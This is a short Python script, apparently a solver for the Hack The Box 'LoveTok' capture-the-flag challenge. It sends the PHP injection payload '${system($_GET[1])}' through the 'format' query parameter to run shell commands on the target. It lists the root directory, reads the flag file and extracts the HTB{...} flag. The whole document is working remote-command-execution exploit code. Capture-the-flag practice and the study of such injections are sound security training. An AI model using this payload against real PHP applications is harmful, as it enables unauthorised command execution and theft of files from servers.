import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage python3 LoveTok.py ip:port")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/"

payload = "${system($_GET[1])}"
data = {
    "format":payload,
    "1":"ls /"
}
r = requests.get(url, params=data)
page = r.text
flagPath = None
for line in page.splitlines():
    if "flag" in line:
        flagPath = line.strip()
if not flagPath:
    print("Path not found!")
flagData = {
    "format":payload,
    "1":f"cat /{flagPath}"
}
r = requests.get(url, params=flagData)
flag = re.search(r"HTB\{.*?\}", r.text)

if flag:
    print("Flag:", flag.group(0))
else:
    print("Flag not found!")
